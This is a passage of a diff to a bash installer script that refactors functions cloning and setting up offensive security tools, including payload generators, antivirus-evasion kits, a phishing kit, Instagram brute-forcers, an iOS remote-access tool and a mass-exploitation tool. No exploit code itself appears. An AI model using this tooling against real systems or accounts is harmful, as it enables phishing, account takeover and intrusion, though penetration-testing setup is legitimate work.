-		if [[ "$foldname" = "" ]]
+		install_default
+		cloned=$?
+		if [[ "$cloned" == 1 ]]
 		then
-			exit
+			cd setup
+			./setup.sh -c
 		fi
-		if [[ -d "/root/"$foldname"" ]]
-		then
-			echo -e "Removing old..."
-			echo -e "$PAKTC"
-			$READAK
-			rm -r /root/"$foldname"
-		fi
-		cd
-		git clone $gitlink
-		cd /root/$foldname
-		cd setup
-		./setup.sh -c
-		cd
 	}
 	function install_leviathan
 	{
 		foldname="leviathan"
 		gitlink="https://github.com/leviathan-framework/leviathan.git"
-		if [[ "$foldname" = "" ]]
+		install_default
+		cloned=$?
+		if [[ "$cloned" == 1 ]]
 		then
-			exit
+			pip install -r requirements
+			pip2.7 install -r requirements
 		fi
-		if [[ -d "/root/"$foldname"" ]]
-		then
-			echo -e "Removing old..."
-			echo -e "$PAKTC"
-			$READAK
-			rm -r /root/"$foldname"
-		fi
-		cd
-		git clone $gitlink
-		cd /root/$foldname
-		pip install -r requirements
-		
-		pip2.7 install -r requirements
-		cd
 	}
 	function install_fake_image
 	{
 		foldname="FakeImageExploiter"
 		gitlink="https://github.com/r00t-3xp10it/FakeImageExploiter.git"
-		if [[ "$foldname" = "" ]]
+		install_default
+		cloned=$?
+		if [[ "$cloned" == 1 ]]
 		then
-			exit
+			chmod +x *.sh
 		fi
-		if [[ -d "/root/"$foldname"" ]]
-		then
-			echo -e "Removing old..."
-			echo -e "$PAKTC"
-			$READAK
-			rm -r /root/"$foldname"
-		fi
-		cd
-		git clone $gitlink
-		cd /root/$foldname
-		chmod +x *.sh
 	}
 	function install_avet
 	{
 		foldname="avet"
 		gitlink="https://github.com/govolution/avet.git"
-		if [[ "$foldname" = "" ]]
-		then
-			exit
-		fi
-		if [[ -d "/root/"$foldname"" ]]
-		then
-			echo -e "Removing old..."
-			echo -e "$PAKTC"
-			$READAK
-			rm -r /root/"$foldname"
-		fi
-		cd
-		git clone $gitlink
-		cd /root/$foldname
+		install_default
 	}
 	function install_gloom
 	{
 		foldname="Gloom-Framework"
-		gitlink="https://github.com/joshDelta/Gloom-Framework.git"
-		if [[ "$foldname" = "" ]]
+		gitlink="https://github.com/StreetSec/Gloom-Framework.git"
+		install_default
+		cloned=$?
+		if [[ "$cloned" == 1 ]]
 		then
-			exit
+			python install.py
 		fi
-		if [[ -d "/root/"$foldname"" ]]
-		then
-			echo -e "Removing old..."
-			echo -e "$PAKTC"
-			$READAK
-			rm -r /root/"$foldname"
-		fi
-		cd
-		git clone $gitlink
-		cd $foldname
-		python install.py
 	}
 	function install_arcanus
 	{
 		foldname="ARCANUS"
 		gitlink="https://github.com/EgeBalci/ARCANUS.git"
-		if [[ "$foldname" = "" ]]
-		then
-			exit
-		fi
-		if [[ -d "/root/"$foldname"" ]]
-		then
-			echo -e "Removing old..."
-			echo -e "$PAKTC"
-			$READAK
-			rm -r /root/"$foldname"
-		fi
-		cd
-		git clone $gitlink
-		#~ cd $foldname
+		install_default
 	}
 	function install_msfpc
 	{
@@ -9861,113 +10487,48 @@ check_if_ks
 	{
 		foldname="morphHTA"
 		gitlink="https://github.com/vysec/morphHTA.git"
-		if [[ "$foldname" = "" ]]
-		then
-			exit
-		fi
-		if [[ -d "/root/"$foldname"" ]]
-		then
-			echo -e "Removing old..."
-			echo -e "$PAKTC"
-			$READAK
-			rm -r /root/"$foldname"
-		fi
-		cd
-		git clone $gitlink
+		install_default
 	}
 	function install_lfi
 	{
 		foldname="LFISuite"
 		gitlink="https://github.com/D35m0nd142/LFISuite.git"
-		if [[ "$foldname" = "" ]]
-		then
-			exit
-		fi
-		if [[ -d "/root/"$foldname"" ]]
-		then
-			echo -e "Removing old..."
-			echo -e "$PAKTC"
-			$READAK
-			rm -r /root/"$foldname"
-		fi
-		cd
-		git clone $gitlink
+		install_default
 	}
 	function install_unibyav
 	{
 		foldname="UniByAv"
 		gitlink="https://github.com/Mr-Un1k0d3r/UniByAv.git"
-		if [[ "$foldname" = "" ]]
+		install_default
+		cloned=$?
+		if [[ "$cloned" == 1 ]]
 		then
-			exit
+			apt-get install -y mingw-w64
 		fi
-		if [[ -d "/root/"$foldname"" ]]
-		then
-			echo -e "Removing old..."
-			echo -e "$PAKTC"
-			$READAK
-			rm -r /root/"$foldname"
-		fi
-		cd
-		git clone $gitlink
-		apt-get install -y mingw-w64
 	}
 	function install_demiguise
 	{
 		foldname="demiguise"
 		gitlink="https://github.com/nccgroup/demiguise.git"
-		if [[ "$foldname" = "" ]]
-		then
-			exit
-		fi
-		if [[ -d "/root/"$foldname"" ]]
-		then
-			echo -e "Removing old..."
-			echo -e "$PAKTC"
-			$READAK
-			rm -r /root/"$foldname"
-		fi
-		cd
-		git clone $gitlink
+		install_default
 	}
 	function install_dkmc
 	{
 		foldname="DKMC"
 		gitlink="https://github.com/Mr-Un1k0d3r/DKMC.git"
-		if [[ "$foldname" = "" ]]
-		then
-			exit
-		fi
-		if [[ -d "/root/"$foldname"" ]]
-		then
-			echo -e "Removing old..."
-			echo -e "$PAKTC"
-			$READAK
-			rm -r /root/"$foldname"
-		fi
-		cd
-		git clone $gitlink
+		install_default
 	}
 	function install_sechub
 	{
 		foldname="secHub"
-		gitlink="https://github.com/joshDelta/secHub.git"
-		if [[ "$foldname" = "" ]]
+		gitlink="https://github.com/cys3c/secHub.git"
+		install_default
+		cloned=$?
+		if [[ "$cloned" == 1 ]]
 		then
-			exit
+			python installer.py
+			chmod +x /usr/bin/sechub
 		fi
-		if [[ -d "/root/"$foldname"" ]]
-		then
-			echo -e "Removing old..."
-			echo -e "$PAKTC"
-			$READAK
-			rm -r /root/"$foldname"
-		fi
-		cd
-		git clone $gitlink
-		cd $foldname
-		python installer.py
-		chmod +x /usr/bin/sechub
 	}
 	function install_beef
 	{
@@ -9978,24 +10539,15 @@ check_if_ks
 		apt-get -y install python-dev python-setuptools libpcap0.8-dev libnetfilter-queue-dev libssl-dev libjpeg-dev libxml2-dev libxslt1-dev libcapstone3 libcapstone-dev libffi-dev file
 		foldname="MITMf"
 		gitlink="https://github.com/byt3bl33d3r/MITMf"
-		if [[ "$foldname" = "" ]]
+		install_default
+		cloned=$?
+		if [[ "$cloned" == 1 ]]
 		then
-			exit
+			git submodule init
+			git submodule update --recursive
+			pip install -r requirements.txt
+			pip2.7 install -r requirements.txt
 		fi
-		if [[ -d "/root/"$foldname"" ]]
-		then
-			echo -e "Removing old..."
-			echo -e "$PAKTC"
-			$READAK
-			rm -r /root/"$foldname"
-		fi
-		cd
-		git clone $gitlink
-		cd $foldname
-		git submodule init
-		git submodule update --recursive
-		pip install -r requirements.txt
-		pip2.7 install -r requirements.txt
 	}
 	function install_arp_scan
 	{
@@ -10005,21 +10557,12 @@ check_if_ks
 	{
 		foldname="opensource"
 		gitlink="https://github.com/r00t-3xp10it/netool-toolkit"
-		if [[ "$foldname" = "" ]]
+		install_default
+		cloned=$?
+		if [[ "$cloned" == 1 ]]
 		then
-			exit
+			chmod +x INSTALL.sh && ./INSTALL.sh
 		fi
-		if [[ -d "/root/"$foldname"" ]]
-		then
-			echo -e "Removing old..."
-			echo -e "$PAKTC"
-			$READAK
-			rm -r /root/"$foldname"
-		fi
-		cd
-		git clone $gitlink opensource
-		cd $foldname
-		chmod +x INSTALL.sh && ./INSTALL.sh
 	}
 	function install_sqlmap
 	{
@@ -10028,86 +10571,228 @@ check_if_ks
 	function install_patator
 	{
 		foldname="patator"
-		gitlink="https://github.com/lanjelot/patator"
-		if [[ "$foldname" = "" ]]
-		then
-			exit
-		fi
-		if [[ -d "/root/"$foldname"" ]]
-		then
-			echo -e "Removing old..."
-			echo -e "$PAKTC"
-			$READAK
-			rm -r /root/"$foldname"
-		fi
-		cd
-		git clone $gitlink		
+		gitlink="https://github.com/lanjelot/patator.git"		
+		install_default
 	}
 	function install_zeus
 	{
 		foldname="Zeus-Scanner"
 		gitlink="https://github.com/Ekultek/Zeus-Scanner.git"
-		if [[ "$foldname" = "" ]]
+		install_default
+		cloned=$?
+		if [[ "$cloned" == 1 ]]
 		then
-			exit
+			pip install -r requirements.txt
+			pip2.7 install -r requirements.txt
 		fi
-		if [[ -d "/root/"$foldname"" ]]
-		then
-			echo -e "Removing old..."
-			echo -e "$PAKTC"
-			$READAK
-			rm -r /root/"$foldname"
-		fi
-		cd
-		git clone $gitlink
-		cd $foldname
-		pip install -r requirements.txt
-		pip2.7 install -r requirements.txt
 	}
 	function install_evil_droid
 	{
 		foldname="Evil-Droid"
 		gitlink="https://github.com/M4sc3r4n0/Evil-Droid.git"
-		if [[ "$foldname" = "" ]]
+		install_default
+		cloned=$?
+		if [[ "$cloned" == 1 ]]
 		then
-			exit
+			chmod +x evil-droid
 		fi
-		if [[ -d "/root/"$foldname"" ]]
-		then
-			echo -e "Removing old..."
-			echo -e "$PAKTC"
-			$READAK
-			rm -r /root/"$foldname"
-		fi
-		cd
-		git clone $gitlink
-		cd $foldname
-		chmod +x evil-droid
 	}
 	function install_nosqlmap
 	{
 		foldname="NoSQLMap"
 		gitlink="https://github.com/codingo/NoSQLMap.git"
-		if [[ "$foldname" = "" ]]
+		install_default
+		cloned=$?
+		if [[ "$cloned" == 1 ]]
 		then
-			exit
+			python setup.py install
 		fi
-		if [[ -d "/root/"$foldname"" ]]
-		then
-			echo -e "Removing old..."
-			echo -e "$PAKTC"
-			$READAK
-			rm -r /root/"$foldname"
-		fi
-		cd
-		git clone $gitlink
-		cd $foldname
-		python setup.py install
 	}
-	
-	
-	
-	
+	function install_eggshell
+	{
+		foldname="EggShell"
+		gitlink="https://github.com/neoneggplant/EggShell.git"
+		install_default
+		cloned=$?
+		if [[ "$cloned" == 1 ]]
+		then
+			easy_install pycrypto
+			python eggshell.py
+		fi
+	}
+	function install_zerodoor
+	{
+		foldname="Zerodoor"
+		gitlink="https://github.com/Souhardya/Zerodoor.git"
+		install_default
+		cloned=$?
+	}
+	function install_objection
+	{
+		pip3 install objection
+		foldname="objection"
+		gitlink="https://github.com/sensepost/objection.git"
+		install_default
+		cloned=$?
+		if [[ "$cloned" == 1 ]]
+		then
+			python setup.py
+		fi
+	}
+	function install_cromos
+	{
+		foldname="cromos"
+		gitlink="https://github.com/evilsocketbr/cromos.git"
+		install_default
+		cloned=$?
+		if [[ "$cloned" == 1 ]]
+		then
+			python setup.py
+		fi
+	}
+	function install_fsociety
+	{
+		foldname="fsociety"
+		gitlink="https://github.com/Manisso/fsociety.git"
+		install_default
+		cloned=$?
+		if [[ "$cloned" == 1 ]]
+		then
+			chmod +x install.sh
+			./install.sh
+		fi
+	}
+	function install_yuki-chan
+	{
+		foldname="Yuki-Chan-The-Auto-Pentest"
+		gitlink="https://github.com/Yukinoshita47/Yuki-Chan-The-Auto-Pentest.git"
+		install_default
+		cloned=$?
+		if [[ "$cloned" == 1 ]]
+		then
+			chmod 777 wafninja joomscan install-perl-module.sh yuki.sh
+			chmod 777 Module/WhatWeb/whatweb
+			pip install -r requirements.txt
+			chmod +x *.sh
+			./install-perl-module.sh
+		fi
+	}
+	function install_socialfish
+	{
+		foldname="SocialFish"
+		gitlink="https://github.com/UndeadSec/SocialFish.git"
+		install_default
+		cloned=$?
+		if [[ "$cloned" == 1 ]]
+		then
+			pip install -r requirements.txt
+			pip2.7 install -r requirements.txt
+		fi
+	}
+	function install_autosploit
+	{
+		foldname="AutoSploit"
+		gitlink="https://github.com/NullArray/AutoSploit.git"
+		install_default
+	}
+	function install_blazy
+	{
+		foldname="Blazy"
+		gitlink="https://github.com/UltimateHackers/Blazy.git"
+		install_default
+		cloned=$?
+		if [[ "$cloned" == 1 ]]
+		then
+			pip install -r requirements.txt
+		fi
+	}
+	function install_striker
+	{
+		foldname="Striker"
+		gitlink="https://github.com/UltimateHackers/Striker.git"
+		install_default
+		cloned=$?
+		if [[ "$cloned" == 1 ]]
+		then
+			pip install -r requirements.txt
+		fi
+	}
+	function install_hyprpulse
+	{
+		foldname="hyprPulse"
+		gitlink="https://github.com/Ethical-H4CK3R/hyprPulse.git"
+		install_default
+		cloned=$?
+		if [[ "$cloned" == 1 ]]
+		then
+			chmod +x install.sh
+			pip2.7 install -r requirements.txt
+			./install.sh
+			
+		fi
+	}
+	function install_instaburst
+	{
+		foldname="InstaBurst"
+		gitlink="https://github.com/Ethical-H4CK3R/InstaBurst.git"
+		install_default
+		cloned=$?
+		if [[ "$cloned" == 1 ]]
+		then
+			chmod +x install.sh
+			pip2.7 install -r requirements.txt
+			./install.sh
+			
+		fi
+	}
+	function install_sitebroker
+	{
+		foldname="SiteBroker"
+		gitlink="https://github.com/Anon-Exploiter/SiteBroker"
+		install_default
+		cloned=$?
+		if [[ "$cloned" == 1 ]]
+		then
+			pip install -r requirements.txt
+			pip2.7 install -r requirements.txt
+		fi
+	}
+	function install_enigma
+	{
+		foldname="Enigma"
+		gitlink="https://github.com/UndeadSec/Enigma.git"
+		install_default
+	}
+	function install_datasploit
+	{
+		foldname="datasploit"
+		gitlink="https://github.com/DataSploit/datasploit.git"
+		install_default
+		cloned=$?
+		if [[ "$cloned" == 1 ]]
+		then
+			pip install --upgrade --force-reinstall -r requirements.txt
+			pip2.7 install --upgrade --force-reinstall -r requirements.txt
+		fi
+	}
+	function install_instagram-py
+	{
+		if [[ -f /usr/local/bin/instagram-py ]]
+		then
+			echo -e ""$YS"Upgrading..."$CE""
+			pip3 install instagram-py --upgrade
+		else
+			echo -e ""$YS"Installing..."$CE""
+			easy_install3 -U pip
+			pip3 install requests --upgrade
+			pip3 install requests[socks]
+			pip3 install stem
+			pip3 install instagram-py
+			instagram-py --create-configuration
+		fi
+	}
+
+		
 #------------------------------------
 ####################################
 defaults_l
